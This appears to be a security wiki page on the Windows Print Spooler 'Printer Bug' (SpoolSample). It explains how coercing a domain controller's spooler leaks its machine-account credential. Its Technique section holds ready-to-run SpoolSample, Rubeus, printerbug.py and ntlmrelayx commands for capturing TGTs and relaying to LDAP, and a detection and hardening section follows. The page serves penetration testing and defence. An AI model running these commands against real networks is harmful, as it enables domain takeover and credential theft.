---
title: Printer Bug (SpoolSample)
slug: printer-bug-spoolsample
---

> **TL;DR:** Call `RpcRemoteFindFirstPrinterChangeNotificationEx` on a victim's spooler — the victim (often a DC) authenticates back to an attacker-chosen host as its computer account, handing over a usable NTLM/Kerberos credential.

## What it is
The "Printer Bug", weaponised by Lee Christensen's `SpoolSample`, abuses the MS-RPRN RPC interface (`\pipe\spoolss`). Any authenticated domain user can call `RpcRemoteFindFirstPrinterChangeNotificationEx` and ask the print spooler to notify a UNC path of changes. The spooler obediently authenticates to that path using the host's machine account — typically `DC01$` — exposing the credential to NTLM relay, Kerberos S4U coercion, or unconstrained-delegation TGT harvest.

## Preconditions / where it applies
- Any valid domain credential (user, machine, or guest where allowed)
- The target's Print Spooler service must be running and reachable on `\pipe\spoolss` (SMB 445)
- The attacker controls a host that the victim can reach by name; for full domain compromise that host needs [[unconstrained-delegation]] or an NTLM relay target like AD CS / LDAP — see [[ntlm]] and [[adcs-attacks]]

## Technique
Run `SpoolSample` (C#) or `printerbug.py` (Impacket) from a foothold, pointing the victim at your listener. Pair with `Rubeus monitor` to scoop the inbound TGT (unconstrained delegation path) or `ntlmrelayx -t ldaps://dc --delegate-access` to perform RBCD ([[resource-based-constrained-delegation]]).

```powershell
# Coerce DC01 to authenticate to ATTACKER-WS (which has unconstrained delegation)
.\SpoolSample.exe dc01.corp.local attacker-ws.corp.local

# Capture the TGT as it arrives
Rubeus.exe monitor /interval:1 /filteruser:DC01$
```

```bash
# Impacket equivalent + RBCD relay chain
ntlmrelayx.py -t ldaps://dc02 --delegate-access --no-dump --no-da
printerbug.py 'corp.local/lowpriv:Pass1!@dc01' attacker-ws
```

The spooler ignores SPN mismatches, so relays into LDAP, HTTP (AD CS ESC8), and SMB all work. Disabling the Print Spooler service on DCs is the canonical fix; `RegisterSpoolerRemoteRpcEndPoint=2` only blocks the RPC endpoint, not the named pipe.

## Detection and defence
- Sysmon Event ID 18 (`PipeConnected`) on `\spoolss` from non-print hosts
- Windows Security 5145 with object name containing `spoolss` and access mask `0x12019F`
- Event 4624 logon on DC initiated by another DC over SMB is anomalous (machine account auth pattern)
- Hardening: stop and disable `Spooler` on all DCs and tier-0 servers; enable `RestrictRemoteSpooler` (Point and Print GPO); consider [[ntlm-relay-ws2025-mitigations]] for channel-binding defences

## References
- [ired.team — Domain Compromise via DC Print Server & Kerberos Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation) — original walkthrough
- [SpecterOps — Not A Security Boundary: Breaking Forest Trusts](https://specterops.io/blog/2018/04/24/) — Lee Christensen's printer-bug disclosure
- [Impacket printerbug.py](https://github.com/fortra/impacket/blob/master/examples/printerbug.py) — reference implementation
